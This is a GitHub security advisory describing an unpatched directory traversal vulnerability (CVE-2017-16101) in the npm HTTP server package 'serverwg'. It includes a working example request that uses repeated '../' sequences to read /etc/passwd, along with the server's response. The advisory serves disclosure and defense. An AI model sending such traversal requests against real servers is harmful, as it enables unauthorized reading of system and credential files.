# [H] Directory Traversal in serverwg

## Summary
Severity: High
Advisory: GHSA-2f29-pmpx-vj62
CVE: CVE-2017-16101
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-2f29-pmpx-vj62
Type: github-advisory

## Affected
- npm: `serverwg` — affected >=0.0.0

## Details
`serverwg` is a simple http server.

`serverwg` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the URL.

**Example request:**
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
host:foo
```
and response:
```
HTTP/1.1 200 OK
Date: Wed, 17 May 2017 22:52:08 GMT
Connection: keep-alive

{contents of /etc/passwd}
```


## Recommendation

No patch is available for this vulnerability.

It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16101
- https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/serverwg
- https://www.npmjs.com/advisories/364
